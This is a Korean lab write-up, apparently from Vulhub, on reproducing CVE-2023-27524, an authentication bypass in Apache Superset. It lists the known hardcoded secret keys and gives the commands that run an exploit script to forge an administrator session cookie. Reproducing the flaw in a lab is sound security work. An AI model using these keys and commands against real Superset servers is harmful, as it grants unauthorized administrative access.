Apache 슈퍼셋 하드코딩된 JWT 비밀 키로 인한 인증 우회(CVE-2023-27524)

환경구성 및 실행
Apache Superset 2.0.1 서버를 시작
docker compose up -d
서버가 시작되면 에서 Superset에 접속할 수 있습니다 http://your-ip:8088. 기본 로그인 정보는 admin/vulhub입니다.

Superset이 다음의 하드코딩된 기본값 중 하나를 사용하기 때문에 취약점이 존재합니다 SECRET_KEY.

- \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h(버전 < 1.4.1)
- CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET(버전 >= 1.4.1)
- thisISaSECRET_1234(배포 템플릿)
- YOUR_OWN_RANDOM_GENERATED_SECRET_KEY(선적 서류 비치)
- TEST_NON_DEV_SECRET(도커 컴포즈)
CVE-2023-27524.py를 사용하여 관리자 세션(user_id가 1인) 쿠키를 위조합니다.

# Install dependencies
pip install -r requirements.txt

# Forge an administrative session (whose user_id is 1) cookie
python CVE-2023-27524.py --url http://your-ip:8088 --id 1 --validate
이 스크립트는 알려진 기본 비밀 키를 사용하여 세션 쿠키를 크래킹하려고 시도합니다. 성공하면 user_id=1(일반적으로 관리자 사용자)로 새 세션 쿠키를 위조하고 로그인을 검증합니다.

쿠키 값에 이 JWT 토큰을 사용하면 Superset의 백엔드 엔드포인트에 액세스할 수 있습니다.
